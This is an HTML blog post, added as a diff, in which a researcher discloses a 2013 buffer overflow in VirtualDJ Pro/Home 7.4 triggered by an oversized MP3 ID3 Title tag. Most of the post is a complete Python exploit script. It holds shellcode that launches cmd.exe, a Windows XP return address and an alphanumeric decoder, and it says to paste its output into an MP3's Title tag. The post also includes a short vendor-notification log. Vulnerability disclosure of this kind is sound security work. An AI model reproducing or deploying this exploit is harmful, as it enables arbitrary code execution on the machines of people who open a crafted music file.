@@ -1,0 +1,147 @@
+<!-- This file has been auto-generated! -->
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>VirtualDJ Pro/Home 7.4: Buffer Overflow</title>
+        <!-- Style -->
+        <link rel="stylesheet" href="../../css/code.css">
+        <link rel="stylesheet" href="../../css/markdown.css">
+        <style>
+            body {
+                box-sizing: border-box;
+                min-width: 200px;
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 45px;
+            }
+
+            header {
+                position: relative;
+            }
+            header > .links {
+                position: absolute;
+                right: 0;
+            }
+
+            .post-key {
+                background-color: hsl(45, 67%, 80%);
+                border-radius: 5px 0px 0px 5px;
+                padding: 2px 6px 2px 8px;
+                margin: 0px;
+            }
+            .post-val {
+                background-color: hsl(45, 67%, 90%);
+                border-radius: 0px 5px 5px 0px;
+                padding: 2px 8px 2px 6px;
+                margin: 0px;
+            }
+
+            footer {
+                text-align: center;
+            }
+        
+            @media (max-width: 767px) {
+                body {
+                    padding: 15px;
+                }
+            }
+        </style>
+    </head>
+    <body class="markdown-body">
+        <header>
+            <div class="links">
+                <span>
+                    <a href="https://twitter.com/AlexAltea">Twitter</a> |
+                    <a href="https://github.com/AlexAltea">Github</a> |
+                    <a href="mailto:alexandro@phi.nz">Email</a>
+                </span>
+            </div>
+            <span><a href="../../">&lt; Other articles</a></span>
+        </header>
+        <article>
+            <h1>VirtualDJ Pro/Home 7.4: Buffer Overflow</h1>
+            <p>
+                <span 
+                    class="post-key">Author</span><span
+                    class="post-val">Alexandro Sanchez</span>
+                <span
+                    class="post-key">Date</span><span
+                    class="post-val">2013-04-20</span>
+            </p>
+            <p>I have found a buffer overflow vulnerability in <a href="http://www.virtualdj.com/">VirtualDJ Pro 7.4 and VirtualDJ Home 7.4</a> and possibly previous versions of this software. After right-clicking a file and entering the "<em>File Infos</em>" &gt; "<em>Cover...</em>" menu, VirtualDJ tries to find a cover for the given file on Google Images and stores the request URL in a buffer which looks like: <code>"http://images.google.com/images?q=X"</code> where <code>X</code> corresponds to the ID3 tag <em>Title</em>. Special characters of this tag are ignored, and any sequence of symbols (e.g. <code>' '</code>, <code>'-'</code>, <code>'_'</code>) is replaced with <code>'+'</code>. The problem is <a href="../2013-03-30-virtualdj-73-buffer-overflow/">once again</a> that VirtualDJ does not check if the information stored in the ID3 tags is too big to fit in the buffer.</p>
+<p>To exploit this vulnerability, I searched for a <code>call esp</code> instruction stored in an address that could be represented with alphanumeric characters, I found such instruction in 0x444D4C64, that is, <code>"dLMD"</code>. After entering this call, all the bytes after the <em>Fake Title</em> + <em>Spaces</em> + <em>Padding</em> + <code>"dLMD"</code> will be executed. Since we can only use alphanumeric characters, we have to encode the shellcode and decode it in execution time using only bytes in range <code>[0-9A-Za-z]</code>. For this purpose I used a function from <a href="http://code.google.com/p/alpha3/">ALPHA3</a>. After that, the original shellcode will be decoded and executed.</p>
+<div class="codehilite"><pre><span></span><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.4 Buffer Overflow Vulnerability </span>
+<span class="c1">#By: Alexandro Sanchez Bach | functionmixer.blogspot.com </span>
+<span class="c1">#More info: http://www.youtube.com/watch?v=Yini294AR2Q </span>
+
+<span class="k">def</span> <span class="nf">encodeData</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;Shellcode must be NULL free&quot;</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="c1">#End of shellcode </span>
+    <span class="n">encData</span> <span class="o">=</span> <span class="n">decoder</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
+    <span class="n">decoder</span> <span class="o">=</span> <span class="n">decoder</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
+        <span class="n">dByte</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">p</span><span class="p">])</span>
+        <span class="n">pxByte</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">encData</span><span class="p">[</span><span class="n">p</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">bx</span><span class="p">,</span> <span class="n">by</span> <span class="o">=</span> <span class="n">encoder</span><span class="p">(</span><span class="n">dByte</span> <span class="o">^</span> <span class="n">pxByte</span><span class="p">,</span> <span class="n">validValues</span><span class="p">)</span>
+        <span class="n">encData</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">bx</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">by</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">decoder</span> <span class="o">+</span> <span class="n">encData</span>
+
+<span class="k">def</span> <span class="nf">encoder</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span> 
+      <span class="k">for</span> <span class="n">bx</span> <span class="ow">in</span> <span class="n">validValues</span><span class="p">:</span>
+        <span class="n">imul</span> <span class="o">=</span> <span class="p">(</span><span class="n">bx</span> <span class="o">*</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xFF</span>
+        <span class="k">for</span> <span class="n">by</span> <span class="ow">in</span> <span class="n">validValues</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">imul</span> <span class="o">^</span> <span class="n">by</span> <span class="o">==</span> <span class="n">value</span><span class="p">:</span> <span class="k">return</span> <span class="p">[</span><span class="n">bx</span><span class="p">,</span> <span class="n">by</span><span class="p">]</span>
+
+
+<span class="c1">#Shellcode (e.g. run cmd.exe) </span>
+<span class="n">shellcode</span>  <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3</span><span class="s2">&quot;</span>
+<span class="n">retAddress</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xED\x1E\x94\x7C</span><span class="s2">&quot;</span> <span class="c1"># jmp ESP ntdll.dll WinXP SP2 </span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">retAddress</span>
+
+<span class="c1">#Arguments </span>
+<span class="n">fakeTitle</span>  <span class="o">=</span> <span class="s2">&quot;Greatest Hits of the Internet - Nyan Cat&quot;</span>
+<span class="k">while</span> <span class="n">fakeTitle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  <span class="o">==</span> <span class="s2">&quot; &quot;</span><span class="p">:</span> <span class="n">fakeTitle</span> <span class="o">=</span> <span class="n">fakeTitle</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+<span class="k">while</span> <span class="n">fakeTitle</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot; &quot;</span><span class="p">:</span> <span class="n">fakeTitle</span> <span class="o">=</span> <span class="n">fakeTitle</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">fakeTitle</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz -&quot;</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="s2">&quot;Invalid characters in the fake title&quot;</span>
+<span class="n">fakeTitle2</span> <span class="o">=</span> <span class="n">fakeTitle</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">)</span>
+<span class="k">while</span> <span class="s2">&quot; &quot;</span> <span class="ow">in</span> <span class="n">fakeTitle2</span><span class="p">:</span> <span class="n">fakeTitle2</span> <span class="o">=</span> <span class="n">fakeTitle2</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">)</span>
+
+<span class="c1">#Exploit </span>
+<span class="n">exploit</span> <span class="o">=</span>  <span class="n">fakeTitle</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span><span class="o">*</span><span class="mi">1024</span> <span class="o">+</span> <span class="s2">&quot;1&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">1026</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">fakeTitle2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;dLMD&quot;</span> <span class="c1">#RETN address </span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;XXAI&quot;</span> <span class="c1">#ESP := Baseaddr of encoded payload </span>
+<span class="n">exploit</span> <span class="o">+=</span> <span class="n">encodeData</span><span class="p">(</span>
+    <span class="s2">&quot;TYhffffk4diFkDql02Dqm0D1CuEE&quot;</span><span class="p">,</span> <span class="c1">#Baseaddr of encoded payload := ESP </span>
+    <span class="n">shellcode</span><span class="p">,</span>
+    <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">))</span>
+<span class="p">)</span>
+
+<span class="k">print</span> <span class="n">exploit</span>
+<span class="c1">#Paste the generated code in the tag &#39;Title&#39; of the MP3 file.</span>
+</pre></div>
+
+
+<p>You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=Yini294AR2Q.</p>
+<h2 id="log">Log</h2>
+<ul>
+<li><strong>2013-04-07</strong>: Bug discovered. VirtualDJ was emailed about this a few days later.</li>
+<li><strong>2013-04-20</strong>: Bug ignored. Exploit published.</li>
+</ul>
+        </article>
+        <hr>
+        <footer>
+            <p>
+                Questions? Comments? <a href="https://github.com/AlexAltea/blog/issues">Open an issue!</a>
+            </p>
+            <p><a href="mailto:alexandro@phi.nz">alexandro@phi.nz</a></p>
+        </footer>
+    </body>
+</html>
